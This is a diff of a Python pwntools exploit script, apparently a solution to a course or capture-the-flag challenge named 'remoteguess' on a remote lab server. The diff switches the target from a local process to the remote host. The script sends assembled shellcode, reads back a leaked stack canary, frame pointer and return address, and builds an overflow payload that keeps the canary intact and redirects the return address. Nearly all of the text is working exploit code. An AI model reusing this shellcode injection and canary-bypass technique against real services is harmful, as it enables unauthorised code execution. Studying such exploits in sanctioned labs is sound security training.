@@ -28,33 +28,17 @@ print(shellcode)
 payload = asm(shellcode)
 print(payload)
 
-r = process("./remoteguess", shell=True)
+# r = process("./remoteguess", shell=True)
 # gdb.attach(r)
 # r = remote("localhost", 10816)
-# r = remote("up23.zoolab.org", 10816)
+r = remote("up23.zoolab.org", 10816)
 
 if type(r) != pwnlib.tubes.process.process:
     solve_pow(r)
 
-if True:
-    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
-    r.sendlineafter(b'to call? ', str(0).encode())
-    r.sendafter(b'bytes): ', payload)
-elif payload != None and False:
-#    ef = ELF(exe)
-    ef = elf
-    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
-#    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
-    r.sendlineafter(b'send to me? ', str(0).encode())
-#    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
-    r.sendlineafter(b'to call? ', str(0).encode())
-    r.sendafter(b'bytes): ', payload)
-else:
-    r.sendlineafter(b'send to me? ', b'0')
-"""
-r.interactive()
-exit(0)
-"""
+r.sendlineafter(b'send to me? ', str(len(payload)).encode())
+r.sendlineafter(b'to call? ', str(0).encode())
+r.sendafter(b'bytes): ', payload)
 r.recvline()
 r.recvuntil(b': ')
 canary=r.recvlineS().strip()
@@ -62,15 +46,13 @@ r.recvuntil(b': ')
 rbp=r.recvlineS().strip()
 r.recvuntil(b': ')
 ra=r.recvlineS().strip()
-print(canary,rbp,ra)
 canary=int(canary,16)
 rbp=int(rbp,16)
-ra=int(ra,16)
-# print(canary,rbp,ra)
-# r.interactive()
+ra=int(ra,16)+0xab
+
 guess=48763
 gen=str(guess).encode('ascii').ljust(0x18,b'\0')+p64(canary)+p64(rbp)+p64(ra)+p64(0)+p32(0)+p32(guess);
-# print(gen,len(gen))
+
 r.sendlineafter(b'answer? ',gen);
 for _ in range(2):
     line=r.recvline()
